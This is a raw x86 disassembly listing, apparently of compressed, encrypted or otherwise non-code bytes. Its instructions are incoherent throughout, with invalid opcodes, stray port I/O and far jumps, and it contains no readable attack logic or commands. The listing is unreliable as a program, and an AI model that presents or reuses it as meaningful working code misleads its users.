  4140ed:	inc    esp
  4140ee:	in     eax,0x1c
  4140f0:	dec    eax
  4140f1:	in     al,0x58
  4140f3:	sub    ebx,DWORD PTR [edi+0x33]
  4140f6:	inc    esp
  4140f7:	call   0x24c1:0xa0aad0d2
  4140fe:	or     al,0xc4
  414100:	nop
  414101:	jp     0x4140ed
  414103:	aas    
  414104:	inc    DWORD PTR [edx-0x60]
  414107:	pop    ds
  414108:	sbb    eax,0xf6ec8f87
  41410d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41410e:	pop    esi
  41410f:	jb     0x4140da
  414111:	fst    DWORD PTR [ecx+0x316e3a0]
  414117:	aam    0x49
  414119:	mov    ebx,0x7b021cc
  41411e:	push   eax
  41411f:	xor    BYTE PTR [ebx+0x51cee30],ah
  414125:	fwait
  414126:	dec    edi
  414127:	icebp  
  414128:	inc    edx
  414129:	mov    ecx,0xff546ba2
  41412e:	lods   al,BYTE PTR ds:[esi]
  41412f:	xor    al,0x96
  414131:	lods   al,BYTE PTR ds:[esi]
  414132:	retf   0xc32f
  414135:	add    DWORD PTR [esi],0xffffffe2
  414138:	mov    esi,0xdcb4f489
  41413d:	shl    BYTE PTR [edi+eiz*4+0x18],cl
  414141:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414142:	mov    ah,0x87
  414144:	shr    BYTE PTR [ebx],cl
  414146:	add    eax,0xa4a93216
  41414b:	bound  edx,QWORD PTR [ebx]
  41414d:	push   esi
  41414e:	(bad)  [ecx+0x3e7c9b3c]
  414154:	(bad)  
  414155:	fstp   st(0)
  414157:	cld    
  414158:	or     BYTE PTR [ebx+0x48],bh
  41415b:	sbb    bh,BYTE PTR ds:0x8dd27aeb
  414161:	adc    DWORD PTR [ebp+0x2b08e609],ebp
  414167:	sbb    eax,0xcc6ea97b
  41416c:	adc    edi,edi
  41416e:	add    al,0x5d
  414170:	out    0x69,al
  414172:	and    al,0x73
  414174:	adc    al,0x71
  414176:	cmp    DWORD PTR [edx-0x7b],eax
  414179:	xor    eax,0x1faba6f7
  41417e:	call   0x9f888de7
  414183:	inc    ecx
  414184:	aaa    
  414185:	and    BYTE PTR [ecx-0x1a5901d7],bh
  41418b:	mov    eax,es
  41418d:	jp     0x4141a6
  41418f:	adc    DWORD PTR [ebx+0x58228ee7],0x9b4622ba
  414199:	xchg   ecx,eax
  41419a:	mov    eax,DWORD PTR [ecx+0x55aa46f8]
  4141a0:	push   ebp
  4141a1:	repnz pop ss
  4141a3:	mov    eax,0x2c58a216
  4141a8:	mov    dl,0x22
  4141aa:	mul    DWORD PTR [edi]
  4141ac:	aad    0xdf
  4141ae:	scas   al,BYTE PTR es:[edi]
  4141af:	je     0x414210
  4141b1:	jl     0x41422f
  4141b3:	(bad)  
  4141b4:	push   esp
  4141b5:	adc    edx,DWORD PTR [esi+edi*1]
  4141b8:	add    DWORD PTR [edx],edi
  4141ba:	mov    cl,0xe
  4141bc:	xchg   ebp,eax
  4141bd:	(bad)  
  4141be:	hlt    
  4141bf:	ins    DWORD PTR es:[edi],dx
  4141c0:	xchg   ebx,eax
  4141c1:	mov    dl,BYTE PTR ss:[edi+ebx*1-0x25]
  4141c6:	bound  ebp,QWORD PTR [ebp+0x6c28d994]
  4141cc:	cld    
  4141cd:	sub    eax,0x9b61d0c8
  4141d2:	mov    edx,0x3226a54e
  4141d7:	lahf   
  4141d8:	icebp  
  4141d9:	loopne 0x41423a
  4141db:	mov    edi,0xf52c6ab6
  4141e0:	js     0x4141ae
  4141e2:	mov    cl,0x6
  4141e4:	push   esp
  4141e5:	xchg   ebx,eax
  4141e6:	std    
  4141e7:	mov    al,dh
  4141e9:	jge    0x41424c
  4141eb:	pop    ds
  4141ec:	sub    bh,dh
  4141ee:	gs inc esi
  4141f0:	(bad)  
  4141f1:	push   esi
  4141f2:	fcomp  QWORD PTR [ecx-0x7]
  4141f5:	mov    bh,0x6b
  4141f7:	lods   al,BYTE PTR gs:[esi]
  4141f9:	lea    ecx,[ebx-0x7de32d93]
  4141ff:	push   eax
  414200:	inc    esi
  414201:	fbld   TBYTE PTR [esi-0x2f]
  414204:	lock pop esp
  414206:	fnsave [edx-0x5b02c7b]
  41420c:	ret    0xc35d
  41420f:	outs   dx,BYTE PTR ds:[esi]
  414210:	lods   eax,DWORD PTR ds:[esi]
  414211:	jno    0x4141f8
  414213:	xor    dh,bh
  414215:	cmp    al,0xbd
  414217:	fdiv   DWORD PTR [esi+esi*4-0x472e470b]
  41421e:	shl    BYTE PTR es:[ebp-0x7a673d93],cl
  414225:	dec    ebx
  414226:	rcl    DWORD PTR [esi+0x17],0xc3
  41422a:	repz dec edx
  41422c:	popa   
  41422d:	cli    
  41422e:	enter  0x99a3,0xae
  414232:	dec    ebp
  414233:	mov    esp,0xac5834e1
  414238:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414239:	cmp    DWORD PTR [edx+0x4fed3185],edi
  41423f:	dec    esi
  414240:	pop    ss
  414241:	(bad)  
  414242:	pop    ecx
  414243:	jne    0x41425e
  414245:	cwde   
  414246:	jns    0x4142ba
  414248:	lahf   
  414249:	pop    ebp
  41424a:	mov    dh,0xd6
  41424c:	pop    edx
  41424d:	xchg   ebp,eax
  41424e:	repnz (bad) 
  414250:	ins    DWORD PTR es:[edi],dx
  414251:	mov    esp,0x56a6da86
  414256:	outs   dx,BYTE PTR ds:[esi]
  414257:	repz std 
  414259:	pop    ds
  41425a:	adc    al,0x21
  41425c:	hlt    
  41425d:	mov    bl,0xb5
  41425f:	inc    ebp
  414260:	push   esi
  414261:	xchg   ebx,eax
  414262:	sbb    al,0x59
  414264:	cdq    
  414265:	or     al,0x7b
  414267:	daa    
  414268:	popf   
  414269:	cli    
  41426a:	sub    DWORD PTR [ecx-0x28217943],eax
  414270:	iret   
  414271:	aad    0x72
  414273:	sub    edx,DWORD PTR [ebp-0x2953d41f]
  414279:	(bad)  
  41427a:	loopne 0x414243
  41427c:	mov    eax,es:0x591d29c4
  414282:	mov    ah,al
  414284:	out    dx,eax
  414285:	add    al,0xe9
  414287:	jg     0x414231
  414289:	pop    edi
  41428a:	loop   0x414249
  41428c:	pop    edi
  41428d:	mov    cl,0xce
  41428f:	add    al,0x52
  414291:	addr16 push cs
  414293:	xor    DWORD PTR ds:0x91477d4,esp
  414299:	xchg   edx,eax
  41429a:	popf   
  41429b:	pop    ds
  41429c:	sbb    eax,0x366a5d7
  4142a1:	pop    ebp
  4142a2:	adc    cl,BYTE PTR [esi+0x388bb745]
  4142a8:	(bad)  
  4142a9:	fisubr WORD PTR [ebp+0x53]
  4142ac:	cwde   
  4142ad:	sub    ch,BYTE PTR [eax]
  4142af:	sbb    BYTE PTR [eiz*1+0x22b33895],cl
  4142b6:	sti    
  4142b7:	or     BYTE PTR [edx+0x26],bl
  4142ba:	pushf  
  4142bb:	mov    DWORD PTR [esi-0x66],eax
  4142be:	and    ebp,0x5d
  4142c1:	xchg   esi,eax
  4142c2:	push   ds
  4142c3:	and    BYTE PTR [ebp-0x3e],bl
  4142c6:	in     al,dx
  4142c7:	daa    
  4142c8:	sbb    ch,BYTE PTR [ebp+0x1d]
  4142cb:	jge    0x41431e
  4142cd:	iret   
  4142ce:	jmp    0x54657d30
  4142d3:	sti    
  4142d4:	loop   0x4142ba
  4142d6:	xor    BYTE PTR [ebp-0xf9e7833],dl
  4142dc:	call   0x8b1b:0xbcdebf35
  4142e3:	aad    0x4c
  4142e5:	or     DWORD PTR [ebx+0x6e],eax
  4142e8:	rol    BYTE PTR ds:0x271b5fad,1
  4142ee:	mov    al,ds:0xdb50d812
  4142f3:	mov    esi,0xd53d3279
  4142f8:	das    
  4142f9:	push   ss
  4142fa:	push   esp
  4142fb:	sub    DWORD PTR [edx-0x59eb4b0],ecx
  414301:	or     DWORD PTR [ecx],0x47e96a24
  414307:	lahf   
  414308:	jmp    0x4142b8
  41430a:	shl    bl,0x93
  41430d:	jnp    0x41430e
  41430f:	pop    ebp
  414310:	rcl    DWORD PTR [ecx],1
  414312:	jecxz  0x414382
  414314:	xor    BYTE PTR [edi-0x3],dl
  414317:	mov    al,ds:0x9b55c9c0
  41431c:	fcomp  DWORD PTR [esi]
  41431e:	xchg   esi,eax
  41431f:	inc    esp
  414320:	(bad)  
  414321:	out    dx,eax
  414322:	leave  
  414323:	mov    ah,0x5a
  414325:	inc    ecx
  414326:	dec    ebp
  414327:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414328:	cmp    eax,0xf6ba45e1
  41432d:	aad    0xf3
  41432f:	jne    0x4143a6
  414331:	aad    0x5d
  414333:	rol    BYTE PTR [edi+0x53],0xb3
  414337:	add    eax,0xb51e0faa
  41433c:	nop
  41433d:	leave  
  41433e:	in     eax,0x67
  414340:	mov    al,0x54
  414342:	and    al,0x89
  414344:	push   cs
  414345:	inc    ecx
  414346:	mov    esi,0x8b562310
  41434b:	mov    ecx,0x58da3b2e
  414350:	xor    DWORD PTR [esi-0x95682f4],0x5b
  414357:	addr16 jg 0x4142db
  41435a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41435b:	ja     0x41438f
  41435d:	and    DWORD PTR [ebx-0x79d0a509],0xffffff84
  414364:	(bad)
  414368:	inc    esp
  414369:	jb     0x414368
  41436b:	xor    BYTE PTR [eax+0x764dbbbc],dl
  414371:	lahf   
  414372:	or     eax,0xc2a7bbc2
  414377:	rcr    DWORD PTR [ecx-0x783cc545],1
  41437d:	or     BYTE PTR [ebx+0x7e4e4a12],dl
  414383:	jl     0x41431a
  414385:	mov    bl,0x81
  414387:	cli    
  414388:	xchg   DWORD PTR ds:0xe7755ebb,eax
  41438e:	dec    eax
  41438f:	inc    edi
  414390:	push   ebx
  414391:	rcr    DWORD PTR [esi+0x30],0xa9
  414395:	in     eax,0x52
  414397:	xchg   ebx,eax
  414398:	mov    dl,0x6f
  41439a:	in     al,dx
  41439b:	xor    dh,cl
  41439d:	and    BYTE PTR [eax+0x2f],cl
  4143a0:	push   cs
  4143a1:	adc    BYTE PTR [ebx],dh
  4143a3:	cld    
  4143a4:	sbb    eax,0x170068d9
  4143a9:	pop    ebx
  4143aa:	lods   eax,DWORD PTR ds:[esi]
  4143ab:	repnz mov cl,0x92
  4143ae:	scas   eax,DWORD PTR es:[edi]
  4143af:	or     DWORD PTR [ebx],edx
  4143b1:	sub    esi,ebx
  4143b3:	call   0x763c3ef9
  4143b8:	jno    0x4143b6
  4143ba:	inc    ecx
  4143bb:	movntps XMMWORD PTR [ebx],xmm2
  4143be:	and    dh,BYTE PTR [ebp-0x11]
  4143c1:	jle    0x414364
  4143c3:	fsubr  DWORD PTR [edx+0x6a]
  4143c6:	mov    esi,0xe54065b9
  4143cb:	inc    edx
  4143cc:	(bad)  
  4143cd:	push   0xffffffd2
  4143cf:	inc    esi
  4143d0:	nop
  4143d1:	xchg   esp,eax
  4143d2:	push   es
  4143d3:	add    BYTE PTR [ebx+0x5f],al
  4143d6:	test   al,0x30
  4143d8:	push   ecx
  4143d9:	loopne 0x41442c
  4143db:	push   ecx
  4143dc:	call   0xc931:0x71ab5a16
  4143e3:	call   0xc6b4:0x36084744
  4143ea:	mov    ebp,0x338185e4
  4143ef:	repnz cmp DWORD PTR ss:[eax+0x1f],edi
  4143f4:	sbb    al,0x19
  4143f6:	loop   0x41443f
  4143f8:	jmp    0x4143ae
  4143fa:	cli    
  4143fb:	mov    eax,0xfddc3f2e
  414400:	test   BYTE PTR [esi],bh
  414402:	arpl   WORD PTR [edi+0x7355d443],ax
  414408:	stc    
  414409:	(bad)  
  41440a:	or     esi,DWORD PTR fs:[edx-0x23]
  41440e:	nop
  41440f:	fucomi st,st(3)
  414411:	adc    ebp,eax
  414413:	pop    edi
  414414:	push   ecx
  414415:	outs   dx,DWORD PTR fs:[esi]
  414417:	push   ds
  414418:	sub    DWORD PTR [edi+edi*4+0x3f],edx
  41441c:	js     0x414489
  41441e:	mov    al,ds:0x8a6afcea
  414423:	sti    
  414424:	aam    0x65
  414426:	push   ds
  414427:	ds pop ebx
  414429:	jns    0x414402
  41442b:	sbb    dl,BYTE PTR [esi+0x3b]
  41442e:	inc    edi
  41442f:	sahf   
  414430:	ror    BYTE PTR fs:[ebp+0x24],cl
  414434:	out    0x32,al
  414436:	sbb    dl,BYTE PTR [esi+ebp*2-0x24e02cd]
  41443d:	es jmp 0x41447c
  414440:	or     al,0xf
  414442:	daa    
  414443:	jmp    0x41445e
  414445:	cdq    
  414446:	pop    ecx
  414447:	cmp    dh,bl
  414449:	lea    eax,[edi-0x51]
  41444c:	adc    al,0x59
  41444e:	adc    ebx,DWORD PTR [edi+0x51037ba0]
  414454:	lahf   
  414455:	add    edx,DWORD PTR [esp+eax*1]
  414458:	into   
  414459:	mov    eax,0xd17d03c9
  41445e:	mov    DWORD PTR [ebp-0x7d],ebp
  414461:	add    al,0xe
  414463:	gs pop esi
  414465:	aam    0x69
  414467:	aam    0x1e
  414469:	in     al,dx
  41446a:	dec    ebp
  41446b:	and    eax,0xba97e503
  414470:	dec    esi
  414471:	adc    al,0x58
  414473:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414474:	xor    BYTE PTR [ecx+0x117433cd],0x1e
  41447b:	dec    eax
  41447c:	xor    DWORD PTR [edx],eax
  41447e:	call   0xf86c:0xf3ac2962
  414485:	add    al,bl
  414487:	lea    edx,[edx-0x1949244a]
  41448d:	ja     0x41443e
  41448f:	sub    eax,0x69930ce7
  414494:	pop    eax
  414495:	push   0xae683b4f
  41449a:	shr    BYTE PTR [esi],0x9c
  41449d:	cwde   
  41449e:	push   cs
  41449f:	and    ebp,DWORD PTR [edx+0x24]
  4144a2:	and    ebp,DWORD PTR ds:0xc1bad8e1
  4144a8:	cld    
  4144a9:	jmp    0x513b:0x4042f4b3
  4144b0:	sbb    eax,0xbe5c986c
  4144b5:	in     al,0xf
  4144b7:	addr16 test ah,al
  4144ba:	add    eax,0x1e4c238f
  4144bf:	inc    edx
  4144c0:	sbb    BYTE PTR [edx+0x1c],dl
  4144c3:	jmp    0xe0e1:0xe1f7f9b3
  4144ca:	ja     0x414472
  4144cc:	jne    0x414543
  4144ce:	(bad)  
  4144cf:	ja     0x4144f1
  4144d1:	(bad)  
  4144d2:	fidivr WORD PTR [ecx+0x1578a747]
  4144d8:	retf   
  4144d9:	(bad)  
  4144da:	fld    QWORD PTR [eax-0x621f4436]
  4144e0:	mov    ebp,0x2920fb11
  4144e5:	lock enter 0x4306,0x5f
  4144ea:	pop    ebp
  4144eb:	and    dh,BYTE PTR [esp+edx*2+0xf]
  4144ef:	loope  0x414548
  4144f1:	mov    ecx,0x180b8428
  4144f6:	icebp  
  4144f7:	dec    esi
  4144f8:	(bad)  
  4144fa:	icebp  
  4144fb:	jmp    0x4144c6
  4144fd:	repnz xor BYTE PTR [ebx+esi*8-0x47],cl
  414502:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414503:	jp     0x414546
  414505:	and    eax,0x7db5d72f
  41450a:	cwde   
  41450b:	(bad)  
  41450c:	repnz push 0x6d10492d
  414512:	pop    ds
  414513:	and    ch,dh
  414515:	test   DWORD PTR [edi+ebp*4+0x2],esp
  414519:	cld    
  41451a:	invd   
  41451c:	loopne 0x41458f
  41451e:	push   ebp
  41451f:	fisttp WORD PTR [ecx-0x4a2bd443]
  414525:	push   esi
  414526:	out    0x7,al
  414528:	sub    ah,al
  41452a:	xor    bl,BYTE PTR [edi+ebx*1]
  41452d:	outs   dx,BYTE PTR ds:[esi]
  41452e:	adc    eax,0x478d9f12
  414533:	mov    edx,0xfb0b77b4
  414538:	fstp   TBYTE PTR [ebp-0x63]
  41453b:	repz icebp 
  41453d:	mov    al,0x35
  41453f:	fisubr DWORD PTR [eax-0x5f]
  414542:	xchg   BYTE PTR [edi+0x4650c431],bh
  414548:	pop    ds
  414549:	mov    ds:0x79e4f69d,al
  41454e:	inc    BYTE PTR [edx-0x25095af3]
  414554:	pop    esi
  414555:	mov    ebx,0xca6292d4
  41455a:	lods   al,BYTE PTR ds:[esi]
  41455b:	(bad)  
  41455c:	jle    0x4145b7
  41455e:	add    DWORD PTR [edi],esp
  414560:	push   esi
  414561:	loop   0x41453a
  414563:	lea    esp,[ecx+0x77]
  414566:	test   ch,0x4e
  414569:	xchg   cl,ch
  41456b:	mov    ebp,0xa6eb7fa2
  414570:	inc    ebx
  414571:	test   BYTE PTR [esi],al
  414573:	fstp   DWORD PTR [edi+edx*8+0x78]
  414577:	data16 and al,0x3
  41457a:	xchg   ebp,eax
  41457b:	mov    esp,0x11ab04f5
  414580:	xchg   esp,eax
  414581:	outs   dx,BYTE PTR ds:[esi]
  414582:	adc    BYTE PTR [ecx-0x1a],ch
  414585:	ret    0x38db
  414588:	and    al,0x16
  41458a:	inc    esi
  41458b:	icebp  
  41458c:	test   al,0xc7
  41458e:	fld    TBYTE PTR [eax-0x19171e5f]
  414594:	int    0x67
  414596:	push   eax
  414597:	xchg   esi,eax
  414598:	out    0xeb,al
  41459a:	(bad)  [eax]
  41459c:	cmp    bl,0x99
  41459f:	and    al,BYTE PTR [esi+0x4f]
  4145a2:	imul   edx,DWORD PTR [ecx+0x7e],0xa21d99a9
  4145a9:	inc    edi
  4145aa:	push   edi
  4145ab:	mov    cl,0xf4
  4145ad:	push   ds
  4145ae:	loop   0x4145d5
  4145b0:	cmc    
  4145b1:	dec    edx
  4145b2:	xor    eax,DWORD PTR [ecx+0x24d2a31b]
  4145b8:	xlat   BYTE PTR ds:[ebx]
  4145b9:	mov    es,WORD PTR [edi+0x6e]
  4145bc:	pop    es
  4145bd:	xor    al,0xd3
  4145bf:	add    esp,DWORD PTR [esp+ebp*1]
  4145c2:	movaps xmm2,XMMWORD PTR [ecx-0x32]
  4145c6:	jno    0x414593
  4145c8:	out    0x53,eax
  4145ca:	jge    0x414550
  4145cc:	pop    eax
  4145cd:	rep stos BYTE PTR es:[edi],al
  4145cf:	mov    edi,0xb3143323
  4145d4:	out    dx,al
  4145d5:	mov    ah,0x3d
  4145d7:	dec    esp
  4145d8:	adc    eax,0xc3c4d908
  4145dd:	fadd   DWORD PTR [ebp-0x7f]
  4145e0:	bound  ax,DWORD PTR [eax+edi*1-0x435c82b2]
  4145e8:	push   ecx
  4145e9:	adc    cl,BYTE PTR [ebx+ebp*4+0x7d20a8b8]
  4145f0:	jge    0x414647
  4145f2:	mov    ds:0xab2d7433,al
  4145f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145f8:	pushf  
  4145f9:	retf   0xeab
  4145fc:	int3   
  4145fd:	fmul   QWORD PTR [esi-0x6d]
  414600:	xchg   ch,bh
  414602:	sub    eax,DWORD PTR [eax]
  414604:	(bad)  
  414605:	sub    eax,ecx
  414607:	test   eax,esp
  414609:	sahf   
  41460a:	loop   0x414629
  41460c:	mov    ecx,0x4c18eb24
  414611:	cli    
  414612:	rol    BYTE PTR [ebx+0x3efcb93e],0x94
  414619:	popa   
  41461a:	std    
  41461b:	inc    ecx
  41461c:	aam    0xa
  41461e:	mov    ch,0x21
  414620:	out    0x4b,al
  414622:	jecxz  0x4145d9
  414624:	mov    dh,0x65
  414626:	iret   
  414627:	adc    edx,DWORD PTR [ecx+0x41be3b60]
  41462d:	adc    cl,BYTE PTR [esi-0x4e404940]
  414633:	es sti 
  414635:	jo     0x41467b
  414637:	pusha  
  414638:	add    al,0x89
  41463a:	clc    
  41463b:	mov    ah,BYTE PTR [ecx+0x331c6d88]
  414641:	adc    DWORD PTR [esi-0x80],ebx
  414644:	les    esi,FWORD PTR [eax+0x6]
  414647:	xchg   eax,esp
  414649:	pop    ebx
  41464a:	addr16 sahf 
  41464c:	stc    
  41464d:	std    
  41464e:	jno    0x41462b
  414650:	scas   al,BYTE PTR es:[edi]
  414651:	add    dh,cl
  414653:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414654:	and    ebx,esi
  414656:	and    al,BYTE PTR [ebx]
  414658:	fwait
  414659:	outs   dx,DWORD PTR ds:[esi]
  41465a:	sub    BYTE PTR [ebx-0x48fd8acf],0xb8
  414661:	retf   0x4aa6
  414664:	xchg   edx,eax
  414665:	stc    
  414666:	push   ebp
  414667:	mov    ds:0x21813b1b,al
  41466c:	mov    ch,ch
  41466e:	push   edi
  41466f:	cmp    ecx,DWORD PTR [ebx]
  414671:	add    eax,0x767198e4
  414676:	mov    WORD PTR [edi+0x36],fs
  414679:	lea    ebp,[edi]
  41467b:	loop   0x4146aa
  41467d:	ds js  0x414610
  414680:	rcr    DWORD PTR [edx+0x6a],cl
  414683:	push   0x27a9bdc
  414688:	or     BYTE PTR [edi-0x6541251f],0x56
  41468f:	mov    al,0x7a
  414691:	xchg   esp,eax
  414692:	cs sbb eax,ebp
  414695:	mov    BYTE PTR [ebx-0x7cf9c37c],ah
  41469b:	icebp  
  41469c:	mov    DWORD PTR [eax],esi
  41469e:	retf   0xbbf1
  4146a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146a2:	add    BYTE PTR [esi-0x45],ah
  4146a5:	xor    al,0xea
  4146a7:	addr16 mov ah,0xe5
  4146aa:	xor    DWORD PTR [edi-0x25],edx
  4146ad:	pop    eax
  4146ae:	sbb    BYTE PTR [ebx+0x5d],0x19
  4146b2:	mov    cl,0x86
  4146b4:	and    esi,DWORD PTR [eax-0x46]
  4146b7:	es jl  0x41464c
  4146ba:	je     0x414731
  4146bc:	(bad)  
  4146bd:	adc    ah,BYTE PTR [ebp+0x236639ba]
  4146c3:	inc    eax
  4146c4:	outs   dx,BYTE PTR ds:[esi]
  4146c5:	mov    dl,0xe6
  4146c7:	ret    
  4146c8:	fisttp DWORD PTR [edi]
  4146ca:	push   0x62
  4146cc:	outs   dx,DWORD PTR ds:[esi]
  4146cd:	data16 lahf 
  4146cf:	xor    bh,cl
  4146d1:	mov    edi,0xe6e5555d
  4146d6:	sbb    al,0xb6
  4146d8:	les    esp,FWORD PTR [edx+0x6b347]
  4146de:	mov    bh,0x63
  4146e0:	xor    DWORD PTR [edx],0xe7426e0
  4146e6:	int3   
  4146e7:	aas    
  4146e8:	push   esi
  4146e9:	push   0xffffffea
  4146eb:	mov    ah,0x73
  4146ed:	les    edi,FWORD PTR [edi+0x9]
  4146f0:	mov    ds:0xc9828ef3,al
  4146f5:	jnp    0x4146d7
  4146f7:	xchg   BYTE PTR [ebp+0x5b],bl
  4146fa:	cmp    DWORD PTR [ecx],0x5f
  4146fd:	fst    QWORD PTR [esi+0xd49e289]
  414703:	test   al,0xe
  414705:	ret    
  414706:	inc    esi
  414707:	dec    eax
  414708:	jge    0x414716
  41470a:	outs   dx,BYTE PTR ds:[esi]
  41470b:	ret    0x90ab
  41470e:	jmp    0x4146eb
  414710:	sbb    al,BYTE PTR [ecx+0x3b]
  414713:	callw  0x3063
  414717:	in     al,0x17
  414719:	in     al,0xd3
  41471b:	and    BYTE PTR fs:[ecx],cl
  41471e:	xlat   BYTE PTR ds:[ebx]
  41471f:	les    ebp,FWORD PTR [edi]
  414721:	sub    DWORD PTR [edi-0x622b2924],eax
  414727:	xor    ch,ch
  414729:	out    0xd3,eax
  41472b:	test   BYTE PTR [eax-0x72d4f629],0x15
  414732:	mov    ah,0xcb
  414734:	je     0x4147a8
  414736:	sub    edx,0xffffffbd
  414739:	push   esp
  41473a:	xchg   esp,eax
  41473b:	dec    ecx
  41473c:	inc    edi
  41473d:	test   BYTE PTR [eax],dh
  41473f:	lea    ebp,[ebx-0x5fc8e021]
  414745:	xchg   edi,eax
  414746:	je     0x414707
  414748:	std    
  414749:	jl     0x4147bc
  41474b:	pushf  
  41474c:	adc    eax,DWORD PTR [esp+eax*1]
  41474f:	push   esi
  414750:	fldpi  
  414752:	xor    eax,0x6b4f51a9
  414757:	iret   
  414758:	mov    bh,0xf0
  41475a:	sub    BYTE PTR [ecx+0x2b],dl
  41475d:	test   DWORD PTR [edx+0x41fe72ef],edx
  414763:	gs (bad) 
  414765:	ror    BYTE PTR [esp+eax*8+0x33],0xd5
  41476a:	xchg   esi,eax
  41476b:	sub    DWORD PTR [esi+0xb],edx
  41476e:	mov    eax,cs:0x5bd82a75
  414774:	int    0x53
  414776:	sub    BYTE PTR [ebx],0x54
  414779:	cmp    BYTE PTR [ecx+ecx*2],ch
  41477c:	mov    ch,0x70
  41477e:	daa    
  41477f:	jmp    0x414722
  414781:	ficom  DWORD PTR [esp+esi*4+0x41]
  414785:	dec    eax
  414786:	ja     0x4147c1
  414788:	sbb    eax,0x1aeea11a
  41478d:	fst    QWORD PTR [ebx+0x1a]
  414790:	xor    al,0xc7
  414792:	fimul  WORD PTR [edi-0x5d]
  414795:	leave  
  414796:	mov    cl,BYTE PTR [ebp-0x76]
  414799:	test   eax,0xd70a86c6
  41479e:	xor    BYTE PTR [ecx-0x1ec4126f],dl
  4147a4:	cwde   
  4147a5:	and    DWORD PTR [edi],eax
  4147a7:	fwait
  4147a8:	dec    ebp
  4147a9:	cmc    
  4147aa:	popf   
  4147ab:	xchg   edi,eax
  4147ac:	pop    ds
  4147ad:	dec    eax
  4147ae:	fnclex 
  4147b0:	or     al,ch
  4147b2:	mov    ebx,0x382e7343
  4147b7:	and    al,0x54
  4147b9:	mov    al,0x88
  4147bb:	jae    0x4147f2
  4147bd:	int    0x2
  4147bf:	cmc    
  4147c0:	and    al,0xab
  4147c2:	jae    0x414768
  4147c4:	xchg   esp,eax
  4147c5:	sub    cl,BYTE PTR [edi-0x55c1bbe1]
  4147cb:	and    eax,0xde8f12b
  4147d0:	push   ss
  4147d1:	sub    al,0xe
  4147d3:	xchg   esp,eax
  4147d4:	push   ebp
  4147d5:	cli    
  4147d6:	adc    BYTE PTR [ebx-0x2671baf6],dl
  4147dc:	scas   al,BYTE PTR es:[edi]
  4147dd:	cli    
  4147de:	pop    eax
  4147df:	cmp    ebp,ebp
  4147e1:	pop    ebp
  4147e2:	call   0x77a6:0xdb6fdeef
  4147e9:	push   0x5fc5d536
  4147ee:	dec    ebp
  4147ef:	call   0x211f:0xd9b8615e
  4147f6:	sbb    BYTE PTR [ecx],ah
  4147f8:	in     eax,0x5c
  4147fa:	in     eax,0xe4
  4147fc:	xchg   esp,eax
  4147fd:	xchg   BYTE PTR [ebx+0xecab26f],dl
  414803:	or     ecx,DWORD PTR [edx-0x3265862b]
  414809:	test   edi,edi
  41480b:	or     eax,0x62fd28ce
  414810:	sbb    BYTE PTR [ebx+0xe0e253f],bh
  414816:	cdq    
  414817:	sti    
  414818:	retf   0x3828
  41481b:	lds    ebp,FWORD PTR [esi+0x64]
  41481e:	jb     0x41481c
  414820:	stc    
  414821:	ins    BYTE PTR es:[edi],dx
  414822:	or     ecx,DWORD PTR [edx]
  414824:	pop    edi
  414825:	mov    ah,BYTE PTR [edx+0x21]
  414828:	xchg   esi,eax
  414829:	lea    ecx,ds:0x8793d885
  41482f:	bound  esp,QWORD PTR [edx]
  414831:	xchg   DWORD PTR [ebx],edx
  414833:	fcom   DWORD PTR [esp+ecx*1]
  414836:	inc    esi
  414837:	ss and edx,ecx
  41483a:	push   ds
  41483b:	scas   eax,DWORD PTR es:[edi]
  41483c:	pop    ecx
  41483d:	dec    ebx
  41483e:	mov    ah,0xe6
  414840:	mov    ss,WORD PTR [edx]
  414842:	je     0x4147ef
  414844:	inc    esi
  414845:	pop    ebp
  414846:	mov    ebx,0xe6141cc0
  41484b:	in     al,0x5b
  41484d:	leave  
  41484e:	mov    eax,ds:0x3211271b
  414853:	in     al,dx
  414854:	mov    bh,0x1c
  414856:	int    0x3
  414858:	out    0x53,al
  41485a:	mov    WORD PTR [esi],?
  41485c:	jmp    0x52af3eff
  414861:	mov    ebp,0xa5af98fb
  414866:	cwde   
  414867:	popa   
  414868:	stc    
  414869:	or     BYTE PTR [ebx+0x6e865773],0xc5
  414870:	ret    
  414871:	mov    cl,0x4c
  414873:	dec    edx
  414874:	fiadd  WORD PTR [edi+eax*2-0x1]
  414878:	je     0x414847
  41487a:	add    esi,0xda6e289f
  414880:	adc    eax,DWORD PTR [edx+0x4d7551a2]
  414886:	in     al,0xf5
  414888:	and    dl,BYTE PTR [esi+0x30]
  41488b:	jb     0x4148d6
  41488d:	sub    ah,BYTE PTR [edi+0x1b]
  414890:	ret    
  414891:	loop   0x414871
  414893:	mov    esp,0x52d89c23
  414898:	pop    ebx
  414899:	rcr    edi,1
  41489b:	cmp    al,0xc6
  41489d:	popf   
  41489e:	retf   0x9c19
  4148a1:	dec    esp
  4148a2:	dec    ebx
  4148a3:	dec    edx
  4148a4:	push   esp
  4148a5:	and    BYTE PTR [ebx+esi*4+0x24bf8465],cl
  4148ac:	xor    BYTE PTR [eax+edi*1+0x7],bl
  4148b0:	retf   
  4148b1:	adc    BYTE PTR [edx],0x63
  4148b4:	add    al,0x1e
  4148b6:	push   cs
  4148b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148b8:	pop    ss
  4148b9:	mov    esp,0x7ec46b79
  4148be:	sbb    dh,cl
  4148c0:	mov    DWORD PTR [ebx],eax
  4148c2:	jecxz  0x4148b2
  4148c4:	and    al,ch
  4148c6:	add    bh,BYTE PTR [ebx+0x60]
  4148c9:	jo     0x414902
  4148cb:	loopne 0x4148ec
  4148cd:	test   DWORD PTR [eax+0x1e],esi
  4148d0:	pop    es
  4148d1:	outs   dx,BYTE PTR ds:[esi]
  4148d2:	aas    
  4148d3:	aam    0x53
  4148d5:	xor    BYTE PTR [eax+0x6c7fd9f9],0x93
  4148dc:	dec    ebx
  4148dd:	or     eax,eax
  4148df:	dec    ebp
  4148e0:	lahf   
  4148e1:	mov    ch,0x25
  4148e3:	xchg   ecx,eax
